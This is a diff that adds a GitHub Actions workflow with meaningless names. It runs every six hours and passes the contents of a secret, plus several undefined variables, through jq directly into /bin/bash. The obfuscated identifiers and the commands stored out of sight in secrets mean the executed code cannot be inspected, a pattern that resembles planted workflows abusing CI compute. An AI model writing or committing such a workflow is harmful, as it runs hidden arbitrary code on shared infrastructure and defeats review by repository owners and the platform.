@@ -1,0 +1,22 @@
+name: retractionincreased
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: retractionincreased
+        env:
+          twfv9261: ${{ secrets.twfv9261 }}
+        run: |
+          echo $twfv9261 | jq -r .efnp628 | /bin/bash
+          echo $xk42972 | jq -r .uqfno6845 | /bin/bash
+          echo $pf8555 | jq -r .ye1 | /bin/bash
+          echo $funo50 | jq -r .pdf28681 | /bin/bash
+          echo $bp5424 | jq -r .n023 | /bin/bash
+
